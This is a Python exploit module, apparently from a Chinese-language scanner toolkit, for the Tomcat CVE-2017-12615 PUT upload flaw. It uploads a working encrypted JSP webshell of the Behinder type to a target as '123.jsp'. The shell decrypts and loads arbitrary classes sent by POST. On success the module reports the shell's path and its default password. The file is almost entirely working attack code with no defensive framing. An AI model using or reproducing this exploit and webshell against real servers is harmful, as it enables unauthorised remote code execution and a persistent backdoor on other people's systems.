import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def CVE_2017_12615(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    payload = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    header = {"User-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
    
    try:
      response = requests.put(url=urldata+'123.jsp/',data=payload,headers=header,timeout=3,verify=False)
      if response.status_code == 201:
        print(Vcolors.RED + "[!] 存在Tomcat CVE_2017_12615漏洞\r" + Vcolors.ENDC)
        print(Vcolors.RED + "[+] webshell地址为123.jsp,冰蝎三默认密码rebeyond\r" + Vcolors.ENDC)
      elif response.status_code == 204:
        print(Vcolors.RED + "[!] 存在Tomcat CVE_2017_12615漏洞,123.jsp文件名存在\r" + Vcolors.ENDC)
    except Exception as e:
        # print(e)
        pass
    except:
        logging.error("CVE_2017_12615脚本出现异常")

